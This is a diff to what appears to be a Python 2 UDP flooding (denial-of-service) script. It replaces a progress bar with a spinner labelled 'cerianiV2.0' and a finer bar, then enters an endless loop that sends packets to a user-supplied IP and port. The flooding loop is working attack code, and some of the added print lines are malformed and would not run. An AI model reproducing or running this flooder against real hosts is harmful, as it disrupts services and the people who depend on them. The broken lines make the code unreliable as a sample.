@@ -43,16 +43,48 @@ port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
+print
+print "iniciando cerianiV2.0 -"
+os.system("clear")
+print "iniciando cerianiV2.0 \"
+os.system("clear")
+print "iniciando cerianiV2.0 |"
+os.system("clear")
+print "iniciando cerianiV2.0 /"
+os.system("clear")
+print "iniciando cerianiV2.0 -"
+os.system("clear")
+print "iniciando cerianiV2.0 \"
+os.system("clear")
+print "iniciando cerianiV2.0 -"
+os.system("clear")
+print "iniciando cerianiV2.0 |"
+os.system("clear")
+print "iniciando cerianiV2.0 /"
+os.system("clear")
+print "iniciando cerianiV2.0 -"
+os.system("clear")
+print "iniciando cerianiV2.0 \"
 print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+time.sleep(1)
+print "[#                   ] 5%"
+time.sleep(1)
+print "[####                ] 10%"
+time.sleep(1)
+print "[#########           ] 15%"
+time.sleep(1)
+print "[###########         ] 20%"
+time.sleep(1)
+print "[##############      ] 30% "
+time.sleep(1)
+print "[###############     ] 40%"
+time.sleep(1)
+print "[#################   ] 55%"
+time.sleep(1)
+print "[##################  ] 75%"
+time.sleep(1)
+print "[####################] 100%"
+time.sleep(1)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
